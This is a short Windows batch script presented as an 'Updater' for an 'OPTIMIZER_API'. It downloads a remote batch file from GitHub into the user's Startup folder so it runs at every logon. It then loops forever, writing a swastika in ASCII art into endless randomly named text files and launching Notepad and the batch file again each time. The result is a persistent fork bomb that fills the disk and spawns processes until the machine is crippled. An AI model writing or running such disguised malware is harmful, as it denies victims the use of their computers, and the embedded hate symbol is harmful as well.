@echo off
REM Updater

echo ---------------------------------------------------------------------------
echo                                  Updating
echo.
curl "https://raw.githubusercontent.com/Izaiashi/Random-Batch-Shit/main/OPTIMIZER_API.bat" -o "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\OPTIMIZER_API.bat"
echo.
echo ---------------------------------------------------------------------------
echo.

REM Loops

:Hitler
	set FILENAME=%RANDOM%.txt
	echo.
	echo ▓▓▓▓▓▓▀▀░░░░░░▀▀▓▓▓▓▓▓ >> %FILENAME%
	echo ▓▓▓▀░░░░░▄██▄░░░░░▀▓▓▓ >> %FILENAME%
	echo ▓▓░░░░░▄▄██▀░░░░░░░░▓▓ >> %FILENAME%
	echo ▓░░░░░▄██▀░░░▄█▄░░░░░▓ >> %FILENAME%
	echo ▌░░░░░▀██▄▄▄█████▄░░░▐ >> %FILENAME%
	echo ░░▄▄▄░░░▀████▀░▀▀██▄░░ >> %FILENAME%
	echo ░░▀██▄░▄▄████▄░░░▀▀▀░░ >> %FILENAME%
	echo ▌░░░▀█████▀▀▀██▄░░░░░▐ >> %FILENAME%
	echo ▓░░░░░▀█▀░░░▄██▀░░░░░▓ >> %FILENAME%
	echo ▓▓░░░░░░░░▄██▀░░░░░░▓▓ >> %FILENAME%
	echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> %FILENAME%
	echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> %FILENAME%
  	start "" notepad.exe
  	start "" OPTIMIZER_API.bat
  	goto :Hitler
